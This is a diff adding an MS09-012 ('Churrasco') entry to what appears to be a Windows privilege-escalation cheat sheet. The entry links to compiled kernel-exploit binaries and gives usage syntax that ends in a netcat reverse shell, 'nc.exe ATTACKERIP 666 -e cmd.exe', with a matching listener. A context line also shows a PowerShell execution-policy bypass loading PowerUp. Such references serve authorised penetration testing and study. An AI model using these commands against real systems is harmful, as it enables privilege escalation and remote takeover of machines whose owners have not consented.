@@ -617,6 +617,21 @@ powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-All
 [Back](#summary)
 
 ## Tricky Exploits
+* MS09-12
+	* [Compiled Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
+	* [Compiled Exploit 2 - Not Tested](https://github.com/egre55/windows-kernel-exploits/tree/master/MS09-012:%20Churrasco)
+	* Note: MS09-12 is also called Churrasco
+	* Syntax
+	```
+	pr.exe "command"
+
+	pr.exe "whoami"
+
+	//transfer or find nc.exe 
+
+	pr.exe "nc.exe ATTACKERIP 666 -e C:\WINDOWS\System32\cmd.exe"
+	nc -nlvp 666
+	```
 * MS16-032
 	* Check if RDP is enabled
 		* If so, run 
